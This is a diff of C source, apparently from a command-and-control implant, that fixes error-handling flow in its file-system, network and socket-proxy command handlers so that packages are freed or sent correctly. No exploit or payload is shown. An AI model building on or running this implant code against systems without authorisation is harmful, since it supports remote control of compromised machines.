@@ -731,7 +731,7 @@ VOID CommandFS( PPARSER Parser )
                 Instance.Win32.FindClose( hFile );
 
                 PUTS( "LEAVE" )
-                goto LEAVE;
+                goto CLEAR_LEAVE;
             }
 
             do
@@ -849,7 +849,7 @@ VOID CommandFS( PPARSER Parser )
             }
 
             if ( ! Success )
-                goto LEAVE;
+                goto CLEAR_LEAVE;
 
             break;
         }
@@ -915,7 +915,7 @@ VOID CommandFS( PPARSER Parser )
             }
 
             if ( ! Success ) {
-                goto LEAVE;
+                goto CLEAR_LEAVE;
             }
 
             break;
@@ -928,7 +928,7 @@ VOID CommandFS( PPARSER Parser )
 
             if ( ! Instance.Win32.SetCurrentDirectoryW( Path ) ) {
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                goto LEAVE;
+                goto CLEAR_LEAVE;
             } else {
                 PackageAddWString( Package, Path );
             }
@@ -946,7 +946,7 @@ VOID CommandFS( PPARSER Parser )
             {
                 if ( ! Instance.Win32.RemoveDirectoryW( Path ) ) {
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                    goto LEAVE;
+                    goto CLEAR_LEAVE;
                 } else {
                     PackageAddInt32( Package, TRUE );
                 }
@@ -955,7 +955,7 @@ VOID CommandFS( PPARSER Parser )
             {
                 if ( ! Instance.Win32.DeleteFileW( Path ) ) {
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                    goto LEAVE;
+                    goto CLEAR_LEAVE;
                 } else {
                     PackageAddInt32( Package, FALSE );
                 }
@@ -974,7 +974,7 @@ VOID CommandFS( PPARSER Parser )
             if ( ! Instance.Win32.CreateDirectoryW( Path, NULL ) )
             {
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                goto LEAVE;
+                goto CLEAR_LEAVE;
             }
 
             PackageAddWString( Package, Path );
@@ -998,6 +998,7 @@ VOID CommandFS( PPARSER Parser )
             Success = Instance.Win32.CopyFileW( PathFrom, PathTo, FALSE );
             if ( ! Success ) {
                 PACKAGE_ERROR_WIN32
+                goto CLEAR_LEAVE;
             }
 
             PackageAddInt32( Package, Success );
@@ -1014,7 +1015,7 @@ VOID CommandFS( PPARSER Parser )
 
             if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) ) {
                 PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
-                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() ); 
             } else {
                 PackageAddWString( Package, Path );
             }
@@ -1056,8 +1057,8 @@ VOID CommandFS( PPARSER Parser )
 
     PUTS( "Transmit package" )
     PackageTransmit( Package );
-
-LEAVE:
+    return;
+CLEAR_LEAVE:
     PUTS( "PackageDestroy" )
     PackageDestroy( Package );
 }
@@ -2052,6 +2053,7 @@ VOID CommandNet( PPARSER Parser )
                     {
                         PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                         PackageDestroy( Package );
+                        return;
                     }
                 }
             }
@@ -2747,8 +2749,7 @@ VOID CommandSocket( PPARSER Parser )
                      * send it while we are free and closing the socket. */
                     PackageDestroy( Package );
                     Package = NULL;
-
-                    break;
+                    return;
                 }
 
                 Socket = Socket->Next;
@@ -2776,8 +2777,7 @@ VOID CommandSocket( PPARSER Parser )
              * send it while we are free and closing the sockets. */
             PackageDestroy( Package );
             Package = NULL;
-
-            break;
+            return;
         }
 
         case SOCKET_COMMAND_SOCKSPROXY_ADD: PUTS( "Socket::SocksProxyAdd" )
